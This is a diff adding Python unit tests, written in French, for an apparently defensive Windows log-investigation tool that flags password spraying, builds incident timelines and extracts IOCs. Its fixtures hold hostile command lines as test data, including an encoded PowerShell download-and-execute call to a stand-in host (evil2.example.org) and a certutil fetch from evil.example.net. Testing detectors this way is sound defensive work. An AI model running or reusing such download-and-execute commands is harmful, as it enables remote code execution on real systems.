@@ -920,5 +920,127 @@ class TestRevueFinaleBoutEnBout(_DossierTemporaire):
         self.assertIn("http://evil.example.net/p.exe", valeurs)
 
 
+
+# --- Corrections résiduelles -------------------------------------------------
+import base64 as _b64
+
+
+def _enc(texte):
+    return _b64.b64encode(texte.encode("utf-16-le")).decode()
+
+
+class TestResiduelIOCSansMarqueur(_DossierTemporaire):
+    """Finding 1 : pas d'URL/domaine/IP extraits d'une commande sans marqueur."""
+
+    def test_commande_intranet_du_compte_compromis_sans_ioc_reseau(self):
+        chrome = _brut("2026-05-20T09:35:00Z", 4688, "SRV-FILE02", "u.trois",
+                       process="chrome.exe", parent_process="explorer.exe",
+                       command_line="chrome.exe https://intranet.acme.fr/rh --proxy=10.0.5.5 "
+                                    "198.51.100.77")
+        inv = investiguer(self.jeu(construire_jeu() + [chrome]))
+        q = [q for ch in inv.chronos for q in ch.evenements
+             if q.evt.timestamp.strftime("%H:%M") == "09:35"][0]
+        self.assertTrue(q.suspect and q.sans_marqueur)   # toujours dans la chronologie
+        reseau = {(i.type_misp, i.valeur) for i in inv.iocs
+                  if i.type_misp in ("url", "domain", "ip-dst")}
+        for v in ("https://intranet.acme.fr/rh", "intranet.acme.fr", "acme.fr",
+                  "10.0.5.5", "198.51.100.77"):
+            self.assertFalse(any(val == v for _, val in reseau), v)
+        # ni la ligne de commande elle-même (pas un indicateur réutilisable)
+        self.assertFalse(any("intranet.acme.fr" in i.valeur for i in inv.iocs))
+        # la vraie commande suspecte (certutil lancé par excel) garde ses IOC
+        self.assertIn(("url", "http://evil.example.net/p.exe"), reseau)
+        self.assertIn(("domain", "evil.example.net"), reseau)
+
+    def test_commande_encodee_vers_url_conservee(self):
+        cmd = ("powershell.exe -enc "
+               + _enc("IEX (New-Object Net.WebClient).DownloadString('http://evil2.example.org/a.ps1')"))
+        ps = _brut("2026-05-20T09:36:00Z", 4688, "SRV-FILE02", "u.trois",
+                   process="powershell.exe", parent_process="explorer.exe",
+                   command_line=cmd)
+        inv = investiguer(self.jeu(construire_jeu() + [ps]))
+        paires = {(i.type_misp, i.valeur) for i in inv.iocs}
+        self.assertIn(("url", "http://evil2.example.org/a.ps1"), paires)
+        self.assertIn(("domain", "evil2.example.org"), paires)
+        self.assertIn(("text", cmd), paires)
+
+
+class TestResiduelCasse(_DossierTemporaire):
+    """Finding 2 : comptes et machines Windows insensibles à la casse."""
+    IP = "198.51.100.66"
+
+    @staticmethod
+    def _t(m, s=0):
+        return f"2026-05-21T10:{m:02d}:{s:02d}Z"
+
+    def _echecs(self, comptes, n=12, host="WKS-014"):
+        return [_brut(self._t(0, i * 2), 4625, host, comptes[i % len(comptes)],
+                      self.IP, 3) for i in range(n)]
+
+    def test_spray_meme_compte_casse_differente(self):
+        evts = charger_logs(self.jeu(self._echecs(["J.Martin", "j.martin"])))
+        det = etape1_detection(evts)
+        self.assertEqual([(p.categorie, p.comptes) for p in det.suspectes],
+                         [("force_brute", ["J.Martin"])])
+        # 4 comptes + une variante de casse : sous le seuil de 5 comptes
+        evts = charger_logs(self.jeu(self._echecs(["a", "b", "c", "J.Martin", "j.martin"])))
+        p = etape1_detection(evts).suspectes[0]
+        self.assertEqual((p.categorie, len(p.comptes)), ("force_brute", 4))
+
+    def test_compromission_et_chronologie_casse_differente(self):
+        evts = self._echecs(["j.martin", "a", "b", "c", "d"], host="WKS-014") + [
+            _brut(self._t(5), 4624, "wks-014", "J.MARTIN", self.IP, 3),
+            _brut(self._t(6), 4624, "WKS-014", "j.martin", self.IP, 3),
+            _brut(self._t(7), 4688, "WKS-014", "J.Martin", process="cmd.exe",
+                  parent_process="explorer.exe", command_line="cmd.exe /c whoami"),
+            _brut(self._t(8), 4624, "Wks-014", "j.martin", "10.9.9.9", 3),
+            _brut(self._t(9), 4698, "SRV-X", "j.MARTIN", task_name="\\Maj")]
+        inv = investiguer(self.jeu(evts))
+        self.assertEqual([(c.compte, c.host) for c in inv.piv.compromissions],
+                         [("J.MARTIN", "wks-014")])
+        t2 = expliquer_etape2(inv.piv, False)
+        self.assertIn("mot de passe probablement deviné", t2)
+        natures = [(q.evt.timestamp.strftime("%M"), q.nature) for q in inv.chronos[0].evenements]
+        self.assertEqual(natures, [("05", "connexion_initiale"), ("06", "connexion"),
+                                   ("07", "processus_suspect"), ("08", "connexion"),
+                                   ("09", "tache_planifiee")])
+        q7 = inv.chronos[0].evenements[2]
+        self.assertIn("le compte compromis J.Martin", q7.description)
+        self.assertEqual(inv.chronos[0].comptes_suivis, ["J.MARTIN"])
+        cibles = [(i.type_misp, i.valeur) for i in inv.iocs
+                  if i.type_misp in ("target-user", "target-machine")]
+        self.assertEqual(cibles, [("target-user", "J.MARTIN"), ("target-machine", "wks-014")])
+
+    def test_plan_machine_casse_differente_une_action(self):
+        evts = self._echecs(["u1", "u2", "u3", "u4", "u5"]) + [
+            _brut(self._t(5), 4624, "WKS-014", "u1", self.IP, 3),
+            _brut(self._t(6), 4624, "wks-014", "u2", self.IP, 3)]
+        inv = investiguer(self.jeu(evts))
+        self.assertEqual(len(inv.piv.compromissions), 2)
+        isoler = [a.action for a in inv.actions if a.action.startswith("Isoler")]
+        self.assertEqual(isoler, ["Isoler WKS-014 du réseau"])
+        self.assertIn("connecté avec succès à WKS-014,",
+                      expliquer_etape4(inv.actions, inv.gravite, inv.piv, inv.chronos))
+
+    def test_membre_ajoute_casse_differente_suivi(self):
+        evts = self._echecs(["u1", "u2", "u3", "u4", "u5"]) + [
+            _brut(self._t(5), 4624, "WKS-014", "u1", self.IP, 3),
+            _brut(self._t(6), 4720, "WKS-014", "u1", new_account="svc_backup"),
+            _brut(self._t(7), 4720, "WKS-014", "u1", new_account="SVC_Backup"),
+            _brut(self._t(8), 4732, "DC-01", "Administrateur",
+                  group="Admins du domaine", member="SVC_BACKUP"),
+            _brut(self._t(9), 4624, "SRV-Y", "Svc_Backup", "10.9.9.9", 3)]
+        inv = investiguer(self.jeu(evts))
+        ch = inv.chronos[0]
+        self.assertEqual(ch.comptes_suivis, ["u1", "svc_backup"])
+        natures = [q.nature for q in ch.evenements]
+        self.assertEqual(natures.count("ajout_groupe_privilegie"), 1)
+        self.assertIn("mouvement_lateral", natures)
+        retirer = [a for a in inv.actions if a.action.startswith("Retirer SVC_BACKUP")]
+        self.assertEqual(len(retirer), 1)
+        crees = [i.valeur for i in inv.iocs if i.role == "compte_cree"]
+        self.assertEqual(crees, ["svc_backup"])
+
+
 if __name__ == "__main__":
     unittest.main()
